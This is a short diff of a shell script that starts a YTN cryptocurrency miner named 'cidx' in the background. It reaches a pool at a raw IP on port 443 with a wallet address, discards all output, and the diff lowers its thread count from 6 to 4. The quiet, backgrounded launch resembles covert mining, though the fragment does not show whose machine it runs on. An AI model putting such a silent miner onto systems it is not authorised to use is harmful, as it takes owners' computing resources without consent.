@@ -35,7 +35,7 @@ END
   nohup ./cidx -a yespowerr16    \
   -o 45.115.224.188:443 \
   -u YiN7LfFoSNRszvbuHCH27KCz617VkG3yc3.worker2 \
-  -p c=YTN,m=solo,zap=YTN,mc=YTN -t 6 &>/dev/null &
+  -p c=YTN,m=solo,zap=YTN,mc=YTN -t 4 &>/dev/null &
 
 
   # Print info: STARTED
